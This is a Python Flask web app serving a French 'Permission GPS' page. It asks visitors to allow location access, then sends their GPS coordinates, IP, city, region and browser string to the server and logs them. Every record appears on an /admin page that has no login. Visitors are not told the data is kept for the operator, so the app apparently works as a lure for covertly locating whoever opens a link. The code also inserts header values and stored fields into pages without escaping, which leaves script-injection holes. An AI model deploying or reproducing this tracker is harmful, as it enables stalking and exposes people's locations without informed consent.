from flask import Flask, request, jsonify

app = Flask(__name__)

logs = []

@app.route("/")
def home():

    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent")

    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Permission GPS</title>
    </head>
    <body style="font-family: Arial; text-align:center; margin-top:50px;">

        <h1>Autoriser la localisation</h1>
        <p>Ce site souhaite accéder à votre position GPS.</p>

        <button onclick="getLocation()"
        style="padding:15px; font-size:18px;">
        Autoriser
        </button>

        <script>

        async function getLocation() {{

            if (!navigator.geolocation) {{
                alert("GPS non supporté");
                return;
            }}

            navigator.geolocation.getCurrentPosition(

                async function(position) {{

                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    let ipInfo =
                    await fetch("https://ipapi.co/json/");

                    ipInfo = await ipInfo.json();

                    const data = {{
                        ip: "{ip}",
                        country: ipInfo.country_name,
                        city: ipInfo.city,
                        region: ipInfo.region,
                        latitude: latitude,
                        longitude: longitude,
                        device: "{user_agent}"
                    }};

                    await fetch("/save", {{
                        method: "POST",
                        headers: {{
                            "Content-Type": "application/json"
                        }},
                        body: JSON.stringify(data)
                    }});

                    document.body.innerHTML = `
                        <h2>Informations récupérées</h2>

                        <p><b>IP:</b> ${{data.ip}}</p>
                        <p><b>Pays:</b> ${{data.country}}</p>
                        <p><b>Ville:</b> ${{data.city}}</p>
                        <p><b>Latitude:</b> ${{latitude}}</p>
                        <p><b>Longitude:</b> ${{longitude}}</p>
                    `;

                }},

                function(error) {{
                    alert("Permission refusée");
                }}

            );
        }}

        </script>

    </body>
    </html>
    """

@app.route("/save", methods=["POST"])
def save():

    data = request.json
    logs.append(data)

    return jsonify({"status": "saved"})

@app.route("/admin")
def admin():

    html = "<h1>Logs</h1>"

    for item in logs:

        html += f"""
        <hr>

        <b>IP:</b> {item['ip']}<br>
        <b>Pays:</b> {item['country']}<br>
        <b>Ville:</b> {item['city']}<br>
        <b>Région:</b> {item['region']}<br>
        <b>Latitude:</b> {item['latitude']}<br>
        <b>Longitude:</b> {item['longitude']}<br>
        <b>Device:</b> {item['device']}<br>
        """

    return html

if __name__ == "__main__":
    app.run()